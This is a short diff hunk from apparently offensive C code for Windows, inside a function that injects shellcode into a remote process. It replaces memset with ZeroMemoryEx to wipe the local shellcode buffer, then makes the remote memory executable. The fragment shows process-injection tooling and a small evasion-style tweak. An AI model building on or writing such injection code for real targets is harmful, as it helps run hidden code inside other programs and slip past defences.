@@ -399,7 +399,7 @@ BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sS
 	}
 	PRINTA("[i] Successfully Written %d Bytes\n", (DWORD)sNumberOfBytesWritten);
 
-	memset(pShellcode, '\0', sSizeOfShellcode);
+	ZeroMemoryEx(pShellcode, sSizeOfShellcode);
 
 	// Make the memory region executable
 	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
